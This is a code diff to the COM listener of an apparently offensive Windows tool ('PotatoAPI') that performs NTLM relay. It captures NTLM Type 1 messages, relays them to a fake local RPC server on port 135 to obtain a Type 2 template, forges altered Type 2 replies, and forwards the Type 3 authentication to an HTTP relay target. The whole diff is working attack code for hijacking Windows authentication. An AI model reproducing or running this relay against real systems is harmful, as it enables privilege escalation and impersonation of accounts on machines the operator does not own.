@@ -502,7 +502,10 @@ int PotatoAPI::startCOMListener(void) {
 	int type1BakLen;
 	int httpPacketType1Len, httpPacketType3Len;
 	int iResult2, ntlmType2Len=0, ntlmType3Len = 0;
+	
+	
 	SOCKET HTTPSocket = CreateHTTPSocket(wredir_ip, wredir_port);
+	SOCKET RPCSocket = CreateHTTPSocket(L"127.0.0.1",L"135");
 	
 	do {
 		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
@@ -512,6 +515,8 @@ int PotatoAPI::startCOMListener(void) {
 			ntlmIndex = findNTLMBytes(recvbuf, iResult);
 			if (ntlmIndex != -1 && (recvbuf[ntlmIndex + 8] == 1))
 			{
+				memcpy(type1BakBuffer, recvbuf, iResult);
+				type1BakLen = iResult;
 				memcpy(ntlmType1, recvbuf + ntlmIndex, iResult - ntlmIndex);
 				printf("[*] NTLM Type  1\n");
 				DumpHex(recvbuf, iResult);			//send the new packet sendbuf
@@ -524,6 +529,8 @@ int PotatoAPI::startCOMListener(void) {
 				
 				ExtractType2FromHttp(recvbuf2, iResult2, ntlmType2, &ntlmType2Len);
 				//printf("sent to relay...");
+				memcpy(type1BakBuffer, recvbuf, iResult);
+				type1BakLen = iResult;
 			}
 			if (ntlmIndex != -1 && (recvbuf[ntlmIndex + 8] == 3))
 			{
@@ -534,6 +541,7 @@ int PotatoAPI::startCOMListener(void) {
 				httpPacketType3 = ForgeHTTPRequestType3(ntlmType3, ntlmType3Len, &httpPacketType3Len, wredir_ip);
 				// send the type3 AUTH to the http server, cross the finger :D
 				iSendResult = send(HTTPSocket, httpPacketType3, httpPacketType3Len, 0);
+				
 				 
 
 			}
@@ -552,10 +560,24 @@ int PotatoAPI::startCOMListener(void) {
 			{
 				printf("[*] NTLM Type 2\n");
 				DumpHex(sendbuf, *len);			//send the new packet sendbuf
-				ForgeAndAlterType2Rpc(dcomheader, iResult, ntlmIndex, ntlmType2, ntlmType2Len, sendbuf);
-				*len = ForgeAndAlterType2Rpc(dcomheader, iResult, ntlmIndex, ntlmType2, ntlmType2Len, sendbuf);
+				//ForgeAndAlterType2Rpc(, iResult, ntlmIndex, ntlmType2, ntlmType2Len, sendbuf);
+				if (send(RPCSocket, type1BakBuffer, type1BakLen, 0) == SOCKET_ERROR) {
+					printf("[!] Couldn't communicate with the fake RPC Server\n");
+					break;
+				}
+				// receiving the type2 message from the fake RPC Server to use as a template for our relayed auth
+				iResult = recv(RPCSocket, recvbuf, recvbuflen, 0);
+				if (iResult == SOCKET_ERROR) {
+					printf("[!] Couldn't receive the type2 message from the fake RPC Server\n");
+					break;
+				}
+				ntlmIndex = findNTLMBytes(recvbuf, iResult);
+				*len = ForgeAndAlterType2Rpc(recvbuf, iResult, ntlmIndex, ntlmType2, ntlmType2Len, sendbuf);
+				//ForgeAndAlterType2Rpc(dcomheader, iResult, ntlmIndex, ntlmType2, ntlmType2Len, sendbuf);
+				// 
+				//*len = ForgeAndAlterType2Rpc(dcomheader, iResult, ntlmIndex, ntlmType2, ntlmType2Len, sendbuf);
 				
-
+			
 			}
 
 			iSendResult = send(ClientSocket, sendbuf, *len, 0);
